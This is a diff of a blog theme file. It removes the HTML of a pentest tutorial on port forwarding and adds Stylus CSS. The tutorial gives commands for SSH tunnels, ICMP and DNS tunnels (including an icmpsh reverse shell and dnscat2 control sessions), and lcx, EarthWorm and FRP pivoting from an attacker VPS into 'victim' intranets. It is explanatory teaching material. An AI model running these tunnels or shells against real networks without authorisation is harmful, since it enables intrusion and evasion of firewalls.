@@ -161,365 +161,225 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">About Port Forwarding</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/img/aliwangwang.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">TyeYeah</span>
-                        
-                            <span class="author-label">Lv4</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2020-03-15 21:25:58</span>
-        <span class="mobile">2020-03-15 21:25</span>
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/linux/">linux</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/windows/">windows</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pentest/">pentest</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2.2k Words</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>13 Mins</span>
-        </span>
-    
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <p>When performing penetration testing, there are always network connection limits.<br>Port forwarding can bypass them and provide other advantages.</p>
-<h2 id="SSH-Tunnel"><a href="#SSH-Tunnel" class="headerlink" title="SSH Tunnel"></a>SSH Tunnel</h2><p><code>SSH</code> can automatically encrypt and decrypt all network data between server and client, can also forward network data from other TCP ports via SSH connection, which is called “<code>SSH</code> Tunnel”.</p>
-<p>“<code>SSH</code> Tunnel” has two advantages:</p>
-<ul>
-<li>Encrypt communication data between <code>SSH</code> Client and <code>SSH</code> Server</li>
-<li>Break through firewall restrictions and build some TCP connections that could not be established before</li>
-</ul>
-<h3 id="Basic-Config"><a href="#Basic-Config" class="headerlink" title="Basic Config"></a>Basic Config</h3><p>Configuration files include:</p>
-<ul>
-<li>Server side config: <code>/etc/ssh/sshd_config</code></li>
-<li>Client side config: <code>/etc/ssh/sshd_config</code></li>
-<li>User config: <code>~/.ssh/config</code></li>
-</ul>
-<p>Here are related items </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AllowTcpForwarding yes</span><br><span class="line"><span class="comment"># seems necessary </span></span><br><span class="line"><span class="comment"># default &#x27;yes&#x27;</span></span><br><span class="line">GatewayPorts yes</span><br><span class="line"><span class="comment"># allow all remote to connect local forwarding port</span></span><br><span class="line"><span class="comment"># default &#x27;no&#x27;</span></span><br><span class="line"><span class="comment"># parameter &#x27;clientspecified&#x27; means client assigns one IP to connect</span></span><br><span class="line"><span class="comment"># if we have:</span></span><br><span class="line"><span class="comment"># `ssh -R specified_ip:local_port:remote_ip:remote_port www.example.com`</span></span><br><span class="line"><span class="comment"># &#x27;specified_ip&#x27; is the allowed IP</span></span><br><span class="line">TCPKeepAlive yes</span><br><span class="line"><span class="comment"># helps detect dead connection, improper connection, client crash</span></span><br><span class="line"><span class="comment"># default &#x27;yes&#x27;</span></span><br><span class="line">PasswordAuthentication yes</span><br><span class="line"><span class="comment"># always needed</span></span><br></pre></td></tr></table></figure>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
-<h3 id="Detailed-Parameters"><a href="#Detailed-Parameters" class="headerlink" title="Detailed Parameters"></a>Detailed Parameters</h3><p>Here are related parameters for building the tunnel</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-C -- compress transmission, speed it up </span><br><span class="line">-f -- authenticate in the background</span><br><span class="line">-N -- only forwarding without getting shell</span><br><span class="line">-q -- quiet mode, no debug info</span><br><span class="line">-l -- assign ssh username</span><br><span class="line">-g -- allow remote to connect local </span><br><span class="line">-L -- local forwarding</span><br><span class="line">-R -- remote forwarding</span><br><span class="line">-D -- dynamic forwarding (socks proxy)</span><br><span class="line">-T -- no pseudo terminal assignment</span><br><span class="line">-p -- assign remote ssh port</span><br></pre></td></tr></table></figure>
 
-<h3 id="Local-Forwarding"><a href="#Local-Forwarding" class="headerlink" title="Local Forwarding"></a>Local Forwarding</h3><p>Transfer local port data to remote host. Local host is ssh client and application client. </p>
-<p>We have 3 objects:</p>
-<ul>
-<li>Attacker pc</li>
-<li>VPS with public ip</li>
-<li>Target&#x2F;Victim pc</li>
-</ul>
-<p>The situation is, VPS is allowd to connect target while attacker isn’t.</p>
-<p>If attacker want to connect target’s 3389 to use rdp, on attacker pc we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -C -f -N -g -L local_port:remote_ip:remote_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># it means: </span></span><br><span class="line"><span class="comment"># forward localhost:local_port to remote_ip:remote_port via tunnel</span></span><br><span class="line"><span class="comment"># `-L` means ssh from local to tunnel, and listening local port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line">$ ssh -C -f -N -g -L 33389:target_ip:3389 user@VPS_ip -p 22</span><br></pre></td></tr></table></figure>
-<p>The whole process will be:</p>
-<ol>
-<li>Attacker connects local 33389 </li>
-<li>The network data is transferred to VPS using ssh</li>
-<li>VPS then connects target 3389</li>
-</ol>
-<p>So the ssh tunnel is built from attacker to VPS, and listen attacker pc’s port.</p>
-<h3 id="Remote-Forwarding"><a href="#Remote-Forwarding" class="headerlink" title="Remote Forwarding"></a>Remote Forwarding</h3><p>Transfer remote port data to local host. Local host is ssh client but application server. </p>
-<p>We have 4 objects:</p>
-<ul>
-<li>Attacker pc</li>
-<li>VPS with public ip</li>
-<li>Target&#x2F;Victim pc 1, allow internet</li>
-<li>Target&#x2F;Victim pc 2, disallow internet</li>
-</ul>
-<p>The situation is, only victim 1 is allowed to connect victim 2, and victim 1 can be controlled through internet.</p>
-<p>If attacker want to connect victim 2, on victim 1 (controlled) we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -C -f -N -g -R local_port:remote_ip:remote_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># it means: </span></span><br><span class="line"><span class="comment"># forward tunnel_ip:local_port to remote_ip:remote_port via local</span></span><br><span class="line"><span class="comment"># `-R` means ssh from local to tunnel, but listening tunnel port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">$ ssh -C -f -N -g -R 33389:victim_2_ip:3389 user@VPS_ip -p 22</span><br></pre></td></tr></table></figure>
-<p>The whole process will be:</p>
-<ul>
-<li>Attacker connects VPS port 33389</li>
-<li>VPS transfers data to victim 1 using ssh</li>
-<li>victim 1 then connect victim 2</li>
-</ul>
-<p>So the ssh tunnel is from victim 1 to VPS, but VPS port is listening.</p>
-<p>note: it default listens on <code>127.0.0.1</code> rather than <code>0.0.0.0</code>, so we use <code>rinetd</code> to do local port forwarding</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ apt install rinetd -y</span><br><span class="line">$ vim /etc/rinetd.conf <span class="comment"># add policy </span></span><br><span class="line">...</span><br><span class="line">0.0.0.0 3389 127.0.0.1 33389 <span class="comment"># forwarding policy</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ service rinetd start <span class="comment"># start service</span></span><br><span class="line">$ netstat -an |egrep <span class="string">&quot;3389|33389&quot;</span> <span class="comment"># check listening status </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-<h3 id="Dynamic-Forwarding"><a href="#Dynamic-Forwarding" class="headerlink" title="Dynamic Forwarding"></a>Dynamic Forwarding</h3><p>It is exactly building a <code>SSH</code> encrypted socks4&#x2F;5 proxy tunnel. </p>
-<p>If we are in the same situation as Local Forwarding part gives, but attackers have no information or no target ports of victims, a proxy is needed for infomation gathering.</p>
-<p>On attacker pc, we build a ssh tunnel to VPS</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -C -f -N -g -D listen_port user@Tunnel_Host</span><br><span class="line"><span class="comment"># forward localhost:listen_port to ssh VPS</span></span><br><span class="line"><span class="comment"># no ports specified</span></span><br><span class="line"><span class="comment"># just set up a proxy (part of local forwarding)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">$ ssh -C -f -N -g -D 10080 user@VPS_ip -p 22 </span><br><span class="line"><span class="comment"># listen 127.0.0.1</span></span><br><span class="line">$ ssh -C -f -N -g -D 0.0.0.0:10080 user@VPS_ip -p 22 </span><br><span class="line"><span class="comment"># listen 0.0.0.0</span></span><br></pre></td></tr></table></figure>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-<h2 id="ICMP-Tunnel"><a href="#ICMP-Tunnel" class="headerlink" title="ICMP Tunnel"></a>ICMP Tunnel</h2><p>Since the tunnel is established through the ICMP protocol, to let tunnel server process the received ICMP messages, the system’s ICMP response mechanism needs to be disabled to prevent the kernel from responding to the ping packet.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
 
-<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>It can build server as springboard or proxy.<br>On the same server (as a springboard) , we run <code>ptunnel</code></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt install ptunnel <span class="comment"># install first</span></span><br><span class="line">$ ptunnel <span class="comment"># run </span></span><br></pre></td></tr></table></figure>
+    }
 
-<p>Then on a client, we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ptunnel -p server_ip -lp local_port -da target_ip  -dp target_port</span><br><span class="line"><span class="comment"># -p  server (springboard) ip</span></span><br><span class="line"><span class="comment"># -lp local listening port</span></span><br><span class="line"><span class="comment"># -da final target host ip</span></span><br><span class="line"><span class="comment"># -dp final target host port</span></span><br></pre></td></tr></table></figure>
 
-<p>Connect local listening port to use this tunnel, to reach target host.</p>
-<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>It provides ICMP reverse shell.<br>Click <a class="link"   target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh" >this link<i class="fas fa-external-link-alt"></i></a> to download icmpsh.</p>
-<p>Then on client we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"><span class="comment"># disable ping echo, to keep shell stable</span></span><br><span class="line">$ ./icmpsh_m.py &lt;<span class="built_in">source</span> IP address&gt; &lt;destination IP address&gt;</span><br><span class="line">$ python icmpsh_m.py clent_ip server_ip</span><br></pre></td></tr></table></figure>
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
 
-<p>On server we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; icmpsh.exe -t client_ip</span><br></pre></td></tr></table></figure>
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
 
-<p>Finally a shell is transferred to client.</p>
-<h3 id="Ping-Tunnel"><a href="#Ping-Tunnel" class="headerlink" title="Ping Tunnel"></a>Ping Tunnel</h3><p>It is another tool to provide encrypted ICMP tunnel.<br>Click <a class="link"   target="_blank" rel="noopener" href="http://freshmeat.sourceforge.net/projects/ptunnel/" >this link<i class="fas fa-external-link-alt"></i></a>  to download.</p>
-<p>On the victim (server) we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ptunnel -x whoami</span><br></pre></td></tr></table></figure>
+        .name {
+          color: var(--default-text-color);
+        }
 
-<p>On the attackers’ VPS (client) we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ptunnel -p victim_ip -lp local_port -da target_ip -dp target_port -x whoami</span><br></pre></td></tr></table></figure>
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
 
-<p>Connect local_port to let victim_ip connect target_ip:target_port.</p>
-<h2 id="DNS-Tunnel"><a href="#DNS-Tunnel" class="headerlink" title="DNS Tunnel"></a>DNS Tunnel</h2><p>Intranet generally has strict limits on outbound traffic, but usually do not restrict DNS (UDP 53) requests.</p>
-<p>There are two main working modes: direct connection mode and relay mode.<br>Direct connection mode is like normal proxy.<br>Relay mode looks like<br><img src="/imghost/apf/1.jpg" alt="relay mode"></p>
-<h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>It is the direct connection mode.</p>
-<p>Server side deployment</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ apt-get install ruby-dev </span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/server/ </span><br><span class="line">$ gem install bundler </span><br><span class="line">$ bundle install </span><br><span class="line">$ ruby ./dnscat2.rb  <span class="comment"># run server</span></span><br><span class="line"><span class="comment"># use &#x27;-security=open&#x27; to disable encryption</span></span><br></pre></td></tr></table></figure>
+      }
+    }
 
-<p>Client side deployment</p>
-<ul>
-<li>Compile first<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make (on windows, load `client/win32/dnscat2.vcproj` to Visual Studio and <span class="string">&quot;build&quot;</span> )</span><br></pre></td></tr></table></figure></li>
-<li>Connect secondly<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./dnscat --dns server=server_ip,port=53 --secret=xxx_give_in_server_display_xxx</span><br></pre></td></tr></table></figure></li>
-<li>Use ‘help’ to see commands<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows/sessions  --  display current sessions</span><br><span class="line">window/session -i 1  --  enter session 1</span><br><span class="line">shell  --  create new session</span><br><span class="line">ctrl+z  --  go back to last layer</span><br></pre></td></tr></table></figure>
-Now we use client to control server.</li>
-</ul>
-<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>It is the relay mode like <code>dns2tcp</code> (another util).<br>The point is to register server as DNS server with a domain name.</p>
-<p>First download it and compile to build</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/yarrick/iodine</span><br><span class="line">$ <span class="built_in">cd</span> iodine</span><br><span class="line">$ make install</span><br><span class="line"><span class="comment"># under ./bin/, &#x27;iodined&#x27; is server, &#x27;iodine&#x27; is client</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ apt install iodine <span class="comment"># available for debian</span></span><br></pre></td></tr></table></figure>
+  }
 
-<p>Server side we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ iodined -f -P yourpassword x.x.x.x www.dns.com</span><br><span class="line"><span class="comment"># -f -- display in the front</span></span><br><span class="line"><span class="comment"># -P -- assign auth password</span></span><br><span class="line"><span class="comment"># x.x.x.x -- Custom LAN Virtual IP</span></span><br><span class="line"><span class="comment"># www.dns.com -- DNS domain</span></span><br></pre></td></tr></table></figure>
-<p>After that server adds a virtual netcard dns0 x.x.x.x to build a new LAN.</p>
-<p>Client side we do</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ iodine -f -P yourpassword xx.xx.xx.xx www.dns.com</span><br><span class="line"><span class="comment"># xx.xx.xx.xx -- server ip</span></span><br><span class="line"><span class="comment"># domain name should be the same with server side</span></span><br></pre></td></tr></table></figure>
-<p>After that client also adds dns0 but another ip, and now it connects server via this virtual netcard (build a tunnel).</p>
-<h2 id="LCX-Forwarding"><a href="#LCX-Forwarding" class="headerlink" title="LCX Forwarding"></a>LCX Forwarding</h2><p>port forwarding is useful especially in intranet penetration.<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/search?q=lcx&type=" >Search lcx on Github<i class="fas fa-external-link-alt"></i></a> to get download.</p>
-<h3 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h3><p>These are parameters usages and format</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  lcx-&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"></span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"></span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>We have 3 objects:</p>
-<ul>
-<li>Attacker pc</li>
-<li>VPS with public ip</li>
-<li>Target&#x2F;Victim pc in intranet</li>
-</ul>
-<p>Still VPS is allowd to connect target while attacker isn’t.</p>
-<p>On controlled victim pc in intranet</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; lcx.exe -slave VPS_ip VPS_port intranet_ip intranet_port</span><br><span class="line"># transfer data </span><br><span class="line"># listen VPS_ip:VPS_port </span><br><span class="line"># and transfer to intranet_ip:intranet_port</span><br></pre></td></tr></table></figure>
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
 
-<p>Then on VPS</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; lcx.exe -listen dst_port src_port</span><br><span class="line"># listen data from src_port and transfer to dst_port </span><br><span class="line"># forward local port to local port</span><br><span class="line"># e.g.</span><br><span class="line">&gt; lcx.exe -listen VPS_port connect_port</span><br><span class="line"></span><br><span class="line"># or </span><br><span class="line"></span><br><span class="line">&gt; lcx.exe -tran src_port dst_ip dst_port </span><br><span class="line"># transfer data from src_port to dst_ip:dst_port </span><br><span class="line"># forward local port to remote port </span><br><span class="line"># e.g.</span><br><span class="line">&gt; lcx.exe -tran connect_port VPS_ip VPS_port</span><br></pre></td></tr></table></figure>
 
-<p>Finally on attacker pc</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mstsc /v:VPS_ip:connect_port</span><br></pre></td></tr></table></figure>
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
 
-<h2 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h2><p>Which is called EW&#x2F;ew as well, EarthWorm is capable for SOCKS v5 service setup and port forwarding.<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/search?q=ew&type=" >Search ew on Github<i class="fas fa-external-link-alt"></i></a> to get download.</p>
-<p>The newest edition is <a class="link"   target="_blank" rel="noopener" href="https://github.com/rootkiter/Termite" >Termite on Github<i class="fas fa-external-link-alt"></i></a> (<a class="link"   target="_blank" rel="noopener" href="http://rootkiter.com/Termite/" >Official Site Here<i class="fas fa-external-link-alt"></i></a>)</p>
-<h3 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h3><p>EarthWorm has 6 command formats （ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）.</p>
-<p>socks type tunnel:</p>
-<pre><code>ssocksd  --  start local Socks5 proxy service 
-             use  -l
-rssocks  --  start local Socks5 service, then transfer to another ip 
-             use  -l -e
-rcsocks  --  receive Socks5 service, then transfer to another port
-             use  -d -e
-</code></pre>
-<p>lcx type tunnel:</p>
-<pre><code>lcx_slave, lcx_listen: port forwarding
-lcx_tran: port mapping
 
-lcx_slave  -- like lcx -slave
-              use  -d -e -f -g
-lcx_tran   -- like lcx -tran
-              use  -l -f -g
-lcx_listen -- like lcx -listen
-              use  -l -e
-</code></pre>
-<p>set parameters</p>
-<pre><code>-l -- listen port
--d -- transfer to host ip
--e -- transfer to host port
--f -- connect to host ip
--g -- connect to host port
--t -- set time out
-</code></pre>
-<h3 id="Forward-proxy"><a href="#Forward-proxy" class="headerlink" title="Forward proxy"></a>Forward proxy</h3><p>That is normal proxy server.</p>
-<p>On the socks server</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ew -s ssocksd -l lport</span><br></pre></td></tr></table></figure>
+  .post-tags-box {
+    display: none;
+    margin-top: 1.6rem;
+    justify-content: center;
+    font-size: 1.1rem;
 
-<p>Then use proxychains, proxifier or other tools to connect</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">...</span><br><span class="line">socks5 x.x.x.x lport</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ proxychains wget www.example.com</span><br></pre></td></tr></table></figure>
+    +keep-tablet() {
+      display: flex;
+    }
 
-<h3 id="Reverse-proxy"><a href="#Reverse-proxy" class="headerlink" title="Reverse proxy"></a>Reverse proxy</h3><p>For a pc in intranet, it have to provide a reverse socks to VPS with public ip.</p>
-<p>On intranet pc</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ew -s rssocks -d VPS_ip -e VPS_port</span><br><span class="line"><span class="comment"># transfer socks data to VPS_ip:VPS_port</span></span><br></pre></td></tr></table></figure>
+    +keep-mobile() {
+      margin-top: 1.2rem;
+      font-size: 1rem;
+    }
 
-<p>Then on VPS</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ew -s rcsocks -l lport -e VPS_port</span><br><span class="line"><span class="comment"># transfer data from lport to VPS_port, through socks</span></span><br></pre></td></tr></table></figure>
 
-<p>Use proxychains, proxifier or other tools to connect</p>
-<h3 id="LCX-type"><a href="#LCX-type" class="headerlink" title="LCX type"></a>LCX type</h3><p>Here are examples, which is similar to lcx</p>
-<p>lcx_tran usage</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./ew -s ssocksd  -l 9999</span><br><span class="line">$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
-<p>lcx_listen、lcx_slave usages</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ ./ew -s ssocksd    -l 9999</span><br><span class="line">$ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
-<p>A comprehensive example</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">$ ./ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">$ ./ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure>
+    .tag-item {
+      margin: 0 0.25rem;
+    }
+  }
 
-<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>It is developed by go on <a class="link"   target="_blank" rel="noopener" href="https://github.com/fatedier/frp" >Github<i class="fas fa-external-link-alt"></i></a>, a high-performance reverse proxy application for intranet penetration.</p>
-<p>After extraction there are:<br><code>frpc  frpc_full.ini  frpc.ini  frps  frps_full.ini  frps.ini</code><br>The first three files are client programs and configuration files, last three are server programs and configuration files.</p>
-<p>The situation is, we want to access client (in intranet) through (have to) server –&gt; reverse proxy.</p>
-<p>Server side first.<br>The important part is its config file.</p>
